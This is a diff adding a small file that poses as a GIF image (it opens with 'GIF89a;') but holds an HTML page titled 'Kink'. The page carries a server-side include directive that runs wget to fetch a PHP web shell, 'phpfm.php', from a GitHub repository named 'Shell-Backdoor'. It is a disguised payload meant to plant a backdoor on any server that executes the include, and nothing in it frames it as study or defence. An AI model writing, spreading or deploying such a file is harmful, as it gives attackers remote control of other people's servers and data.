@@ -1,0 +1,13 @@
+GIF89a;
+<!DOCTYPE html>
+<html>
+<head>
+<title>KINK</title>
+</head>
+<body>
+<h1>Kink</h1>
+<pre>
+<!--#exec cmd="wget https://raw.githubusercontent.com/ZildanZ/Shell-Backdoor/refs/heads/main/phpfm.php"-->
+</pre>
+</body>
+</html>
